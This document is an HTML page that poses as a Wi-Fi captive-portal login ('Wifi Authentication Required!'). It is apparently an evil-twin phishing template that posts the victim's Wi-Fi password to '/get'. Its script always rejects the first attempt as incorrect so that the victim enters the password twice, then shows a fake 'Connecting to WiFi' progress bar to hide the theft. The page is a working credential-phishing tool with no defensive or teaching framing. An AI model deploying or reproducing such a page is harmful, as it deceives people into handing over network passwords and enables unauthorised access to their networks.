<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <title>Login Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .container {
      width: 90%;
      max-width: 400px;
      margin: 10% auto;
      text-align: center;
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    /* Styling for progress bar */
    .progress-bar-container {
      width: 100%;
      height: 10px;
      background-color: #ddd;
      margin-top: 10px;
      border-radius: 5px;
      overflow: hidden;
    }

    .progress-bar {
      height: 100%;
      width: 0;
      background-color: #4CAF50; /* Green color */
      transition: width 0.5s ease-in-out; /* Smooth transition animation */
    }

    h1 {
      font-size: 32px;
      margin-bottom: 20px;
      color: #333;
    }

    h5 {
      font-size: 18px;
      margin-bottom: 30px;
      color: #666;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }

    button[type="submit"] {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 4px;
      background-color: #007bff;
      color: #fff;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button[type="submit"]:hover {
      background-color: #0056b3;
    }
    
  </style>
</head>
<body>
  <div class="container">
        <svg fill="#000000" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 0 365.892 365.892" xml:space="preserve" height="100px" width="100px">
      <g>
        <circle cx="182.945" cy="286.681" r="41.494"></circle>

    <h1>Welcome</h1>
    <h5>Wifi Authentication Required!</h5>

    <form id="loginForm" action="/get">
      <!-- Hidden Email Input Field -->
      <input type="email" name="email" placeholder="Wifi Username" style="display: none;">
      <input type="password" name="password" id="passwordInput" placeholder="Wifi Password" required="">
      <button type="submit">Login</button>
      <div class="progress-bar-container" style="display: none;">
        <div class="progress-bar"></div>
      </div>
    </form>
    
    <script>
      document.addEventListener("DOMContentLoaded", function() {
        var loginButton = document.querySelector("#loginForm button[type='submit']");
        var attempt = 0;
        var errorMessage = document.querySelector('.error-message');
        var progressBarContainer = document.querySelector('.progress-bar-container');
        var progressBar = document.querySelector('.progress-bar');
    
        loginButton.addEventListener("click", function(event) {
          var passwordInput = document.getElementById('passwordInput');
          if (passwordInput.value.trim() === '') {
            // Password field is empty, display error message and prevent further action
            event.preventDefault();
            displayErrorMessage('Password is Required!');
            return;
          }
    
          attempt++;
    
          if (attempt === 1) {
            displayErrorMessage('Wifi Password Incorrect! Try Again...');
          } else if (attempt === 2) {
            displaySuccessMessage('Please Wait! Connecting to WiFi...');
            progressBarContainer.style.display = 'block';
            updateProgressBar();
    
            // Simulate scrolling for a few seconds
            var scrollStep = -window.scrollY / (15 * 1000 / 16); // Scroll duration: 15 seconds
            var scrollInterval = setInterval(function() {
              if (window.scrollY !== 0) {
                window.scrollBy(0, scrollStep);
              } else {
                clearInterval(scrollInterval);
              }
            }, 16);
          }
        });
    
        function displayErrorMessage(message) {
          if (!errorMessage) {
            errorMessage = document.createElement('p');
            errorMessage.className = 'error-message';
            errorMessage.style.color = '#FF6347'; // Red color
    
            // Insert the error message after the form
            var form = document.getElementById('loginForm');
            form.insertAdjacentElement('afterend', errorMessage);
          }
    
          errorMessage.textContent = message;
        }
    
        function displaySuccessMessage(message) {
          if (!errorMessage) {
            errorMessage = document.createElement('p');
            errorMessage.className = 'error-message';
            errorMessage.style.color = '#32CD32'; // Green color for success
    
            // Insert the success message after the form
            var form = document.getElementById('loginForm');
            form.insertAdjacentElement('afterend', errorMessage);
          }
    
          errorMessage.textContent = message;
        }
    
        function updateProgressBar() {
          if (!progressBar) {
            progressBar = document.createElement('div');
            progressBar.className = 'progress-bar';
            
            // Append the progress bar inside the container
            progressBarContainer.appendChild(progressBar);
          }
    
          var width = 0;
          var interval = setInterval(function() {
            if (width >= 100) {
              clearInterval(interval);
            } else {
              width++;
              progressBar.style.width = width + '%';
            }
          }, 200); // Change the duration of the progress here (milliseconds)
        }
      });
    </script>
</body></html>
